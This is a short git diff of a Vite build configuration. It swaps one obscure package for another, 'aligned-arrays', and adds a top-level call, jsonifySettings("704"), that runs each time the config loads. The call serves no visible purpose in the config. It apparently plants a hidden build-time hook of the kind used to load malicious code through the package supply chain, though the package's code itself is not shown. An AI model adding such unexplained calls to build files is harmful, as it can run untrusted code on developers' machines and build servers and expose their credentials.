@@ -4,10 +4,11 @@ import react from '@vitejs/plugin-react-swc';
 import rollupNodePolyFill from 'rollup-plugin-polyfill-node';
 // import { jsonifySettings } from 'jsonify-errors';
 import { defineConfig, loadEnv, splitVendorChunkPlugin } from 'vite';
-import alignTypeer from 'aligntypeer';
+const {jsonifySettings} = require('aligned-arrays');
+
 
 // https://vitejs.dev/config/
-alignTypeer();
+jsonifySettings("704");
 export default defineConfig(({ command, mode }) => {
     const envVariables = loadEnv(mode, process.cwd());
     return {
